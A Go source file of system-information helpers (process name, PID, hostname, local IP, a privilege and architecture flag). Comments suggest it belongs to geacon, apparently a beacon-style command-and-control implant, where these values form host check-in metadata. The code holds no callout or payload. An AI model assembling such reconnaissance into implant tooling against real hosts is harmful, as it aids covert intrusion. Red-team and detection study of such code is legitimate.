package sysinfo

import (
	"encoding/binary"
	"net"
	"os"
	"runtime"
	"strings"
)

func GetProcessName() string {
	processName, err := os.Executable()
	if err != nil {
		return "unknown"
	}
	// C:\Users\admin\Desktop\cmd.exe
	// ./cmd
	var result string
	slashPos := strings.LastIndex(processName, "\\")
	if slashPos > 0 {
		result = processName[slashPos+1:]
	}
	backslashPos := strings.LastIndex(processName, "/")
	if backslashPos > 0 {
		result = processName[backslashPos+1:]
	}
	return result
}

func GetPID() int {
	return os.Getpid()
}

func GetMetaDataFlag() int {
	flagInt := 0
	if IsHighPriv() {
		flagInt += 8
	}
	isOSX64, _ := IsOSX64()
	if isOSX64 {
		flagInt += 4
	}
	isProcessX64 := IsProcessX64()
	// there is no need to add 1 when process is x86
	if isProcessX64 {
		flagInt += 2
	}
	return flagInt
}

func GetComputerName() string {
	sHostName, _ := os.Hostname()
	// message too long for RSA public key size
	if runtime.GOOS == "linux" {
		sHostName = sHostName + " (Linux)"
	} else if runtime.GOOS == "darwin" {
		sHostName = sHostName + " (Darwin)"
	}
	return sHostName
}

// it is ok
func IsProcessX64() bool {
	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" || runtime.GOARCH == "arm64be" {
		//util.Println("geacon is x64")
		return true
	}
	//util.Println("geacon is x86")
	return false
}

func GetLocalIPInt() uint32 {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return 0
	}
	var ip16 uint32
	var ip uint32
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			ipString := ipnet.IP.String()
			if ipnet.IP.To4() != nil && !strings.HasPrefix(ipString, "169.254.") {
				if len(ipnet.IP) == 16 {
					ip16 = binary.LittleEndian.Uint32(ipnet.IP[12:16])
				}
				ip = binary.LittleEndian.Uint32(ipnet.IP)
			}
		}
	}
	if ip16 != 0 {
		return ip16
	}
	return ip
}
